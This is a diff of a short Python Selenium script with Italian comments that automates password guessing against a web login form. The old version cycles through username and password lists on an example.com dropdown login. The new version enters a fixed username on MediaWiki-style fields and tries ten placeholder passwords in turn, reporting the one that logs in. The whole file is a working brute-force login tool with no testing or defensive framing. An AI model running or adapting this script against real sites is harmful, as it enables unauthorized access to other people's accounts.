@@ -1,53 +1,45 @@
-import time
 from selenium import webdriver
-from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.common.by import By
-from selenium.common.exceptions import NoSuchElementException
 
-# Liste di username e password
-usernames = ["user1", "user2", "user3"]
-passwords = ["password1", "password2", "password3"]
+lista_parole = ["parola1", "parola2", "parola3", "parola4", "parola5", "parola6", "parola7", "parola8", "parola9",
+                "parola10"]
 
-# Inizializza il driver di Selenium
+# Inizializza il driver del browser (per esempio, Chrome)
 driver = webdriver.Chrome()
 
-# Apri il browser e vai all'URL
-driver.get("https://www.example.com/")
+# Apri la pagina web
+url = "https://www.example.com/login"
+driver.get(url)
 
-for username in usernames:
-    for password in passwords:
-        try:
-            # Trova l'elemento che attiva il dropdown
-            dropdown_element = driver.find_element(By.CSS_SELECTOR, "div.relative.f_right.m_right_10.m_left_10.dropdown_2_container.login")
+# Effettua il clic sul link con l'ID "pt-login"
+login_link = driver.find_element(By.ID, "pt-login")
+login_link.click()
 
-            # Posiziona il cursore sull'elemento
-            actions = ActionChains(driver)
-            actions.move_to_element(dropdown_element).perform()
+# Trova l'elemento del campo di input per il nome utente utilizzando l'ID
+username_field = driver.find_element(By.ID, "wpName1")
+username_field.send_keys("exampleusername")
 
-            # Compila il form con i dati desiderati
-            email_field = driver.find_element(By.NAME, "email_address")
-            password_field = driver.find_element(By.NAME, "password")
+# Itera attraverso la lista delle password
+for password in lista_parole:
+    try:
+        # Trova l'elemento del campo di input per la password utilizzando l'ID
+        password_field = driver.find_element(By.ID, "wpPassword1")
+        password_field.clear()  # Pulisci il campo di input precedente
+        password_field.send_keys(password)
 
-            email_field.clear()
-            email_field.send_keys(username)
-            password_field.clear()
-            password_field.send_keys(password)
+        # Trova il pulsante di login utilizzando l'ID e fai clic su di esso
+        login_button = driver.find_element(By.ID, "wpLoginAttempt")
+        login_button.click()
 
-            # Invia la richiesta POST al server
-            submit_button = driver.find_element(By.ID, "button")
-            submit_button.click()
+        # Verifica se il login è riuscito
+        if "Benvenuto" in driver.page_source:
+            print("Login riuscito con la password:", password)
+            break  # Esci dal ciclo se il login ha successo
+        else:
+            print("Login fallito con la password:", password)
 
-            # Aggiungi un ritardo per consentire al server di elaborare la richiesta
-            time.sleep(2)
+    except:
+        print("Si è verificato un errore durante il login con la password:", password)
 
-            # Cerca nuovamente gli elementi email e password
-            email_field = driver.find_element(By.NAME, "email_address")
-            password_field = driver.find_element(By.NAME, "password")
-
-            print("Accesso fallito - username:", username, "password:", password)
-
-        except NoSuchElementException:
-            print("Accesso riuscito - username:", username, "password:", password)
-            break
-
+# Chiudi il browser
 driver.quit()
